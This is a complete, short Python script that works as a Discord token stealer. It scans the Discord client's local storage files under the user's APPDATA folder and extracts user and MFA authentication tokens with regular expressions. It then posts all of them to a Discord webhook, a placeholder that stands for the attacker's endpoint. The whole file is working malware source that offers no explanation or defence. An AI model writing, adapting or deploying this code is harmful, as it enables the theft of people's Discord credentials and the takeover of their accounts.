import os
import requests
from re import findall

PATH=os.getenv("APPDATA")+"\\Discord\\Local Storage\\leveldb"
WEBHOOK="https://discord.com/api/webhooks/[webhookcode]"


def getToken():
    tokens=[]
    for file_name in os.listdir(PATH):
        if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
            continue
        for line in [x.strip() for x in open(f"{PATH}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

if __name__=="__main__":
    tokens=""
    for i in getToken():
        tokens+=i+'\n'
    requests.post(url=WEBHOOK, data={'content':tokens})
